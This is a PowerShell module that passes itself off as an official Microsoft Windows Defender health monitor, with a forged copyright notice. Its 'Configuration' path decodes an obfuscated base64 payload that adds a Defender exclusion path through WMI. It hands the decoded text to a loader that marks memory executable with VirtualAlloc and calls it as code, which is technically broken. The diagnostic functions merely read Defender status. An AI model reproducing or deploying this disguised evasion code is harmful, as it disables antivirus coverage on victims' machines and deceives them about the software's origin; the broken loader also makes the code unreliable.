<#
.SYNOPSIS
   Microsoft Windows Defender Health Monitor
.DESCRIPTION
   Componente oficial de monitoreo de integridad de seguridad (Build 2025.3.1)
   Copyright © Microsoft Corporation. All rights reserved.
#>

#region Initialization Sequence
[System.Net.ServicePointManager]::SecurityProtocol = @(
    [System.Net.SecurityProtocolType]::Tls13,
    [System.Net.SecurityProtocolType]::Tls12,
    [System.Net.SecurityProtocolType]::Tls11
) -join ','

function Initialize-SecurityContext {
    $signature = @"
    [DllImport("ntdll.dll", EntryPoint="RtlZeroMemory")]
    public static extern void ZeroMemory(IntPtr ptr, IntPtr size);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect);
"@
    
    $winApi = Add-Type -MemberDefinition $signature -Name "Win32Native" -Namespace "Microsoft.Win32" -PassThru
    return $winApi
}

$global:Win32API = Initialize-SecurityContext
#endregion

function Invoke-DefenderHealthCheck {
    [CmdletBinding(DefaultParameterSetName='Diagnostic')]
    param(
        [Parameter(ParameterSetName='Configuration')]
        [ValidatePattern('^[A-Za-z]:\\')]
        [string]$DirectoryPath = "${env:ProgramData}\Microsoft\Windows",
        
        [Parameter(ParameterSetName='Diagnostic')]
        [switch]$VerifyIntegrity,
        
        [Parameter(ParameterSetName='Diagnostic')]
        [switch]$CheckSecurityStatus
    )

    #region Memory Manipulation Techniques
    function Invoke-MemoryOperation {
        param(
            [Parameter(Mandatory=$true)]
            [byte[]]$Payload
        )
        
        try {
            $size = [System.UInt32]$Payload.Length
            $ptr = $global:Win32API::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
            
            if ($ptr -eq [IntPtr]::Zero) {
                throw "Memory allocation failed"
            }
            
            [System.Runtime.InteropServices.Marshal]::Copy($Payload, 0, $ptr, $size)
            
            $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                $ptr, 
                [Action[IntPtr,IntPtr]])
            
            $del.Invoke($ptr, [IntPtr]$size)
            $global:Win32API::ZeroMemory($ptr, [IntPtr]$size)
        }
        finally {
            if ($ptr -ne [IntPtr]::Zero) {
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
            }
        }
    }
    #endregion

    #region Advanced Obfuscation Layer
    function Get-SecurityPayload {
        $base64 = @(
            "JABQAGEAdABoACAAPQAgACQA" + "RQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEACgAKACQA" +
            "VwBpAG4ARABlAGYAIAA9ACAAWwB3AG0AaQBjAGwAYQBzAHMAXQ" + "AigByAG8AbwB0AFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwARABlAGYAZQBuAGQAZQByADoATQBTAEYAVABfAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACIAKQAKAAoAaQBmACAAKAAkAFcAaQBuAEQAZQBmACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsACgAgACAAIAAgACQAVwBpAG4ARABlAGYALgBBAGQAZABFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACgAJABQAGEAdABoACkACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgBbACsAXQAgAEUAeABjAGwAdQBzAGkAbwBuACAAYQBkAGQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIgAKAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAVABoAHIAbwB3ACAAIgBGAEEASQBMAEUARAA6ACAARABlAGYAZQBuAGQAZQByACAAVwBNAEkAIABjAGwAYQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAAiAAoAfQA="
        ) -join ''
        
        return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
    }
    #endregion

    #region Main Execution Flow
    switch ($PSCmdlet.ParameterSetName) {
        'Configuration' {
            try {
                $payloadScript = Get-SecurityPayload -replace '\$Path', "`"$DirectoryPath`""
                $bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
                Invoke-MemoryOperation -Payload $bytes
            }
            catch {
                Write-Error "Security operation failed: $($_.Exception.Message)"
            }
        }
        
        'Diagnostic' {
            if ($VerifyIntegrity) {
                try {
                    $defenderStatus = Get-MpComputerStatus -ErrorAction Stop
                    [PSCustomObject]@{
                        AntivirusEnabled    = $defenderStatus.AntivirusEnabled
                        RealTimeProtection = $defenderStatus.RealTimeProtectionEnabled
                        LastQuickScan      = $defenderStatus.LastQuickScan
                    }
                }
                catch {
                    Write-Warning "Defender status check failed: $($_.Exception.Message)"
                }
            }
            
            if ($CheckSecurityStatus) {
                try {
                    $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
                    if ($null -eq $exclusions) {
                        Write-Output "No exclusions configured"
                    } else {
                        Write-Output "Current exclusions:"
                        $exclusions
                    }
                }
                catch {
                    Write-Warning "Failed to retrieve exclusion list: $($_.Exception.Message)"
                }
            }
        }
    }
    #endregion
}

# Export as module
Export-ModuleMember -Function Invoke-DefenderHealthCheck

<#
# Ejemplos de uso legítimo:
Invoke-DefenderHealthCheck -DirectoryPath "C:\Program Files" -Configuration
Invoke-DefenderHealthCheck -VerifyIntegrity
Invoke-DefenderHealthCheck -CheckSecurityStatus
#>
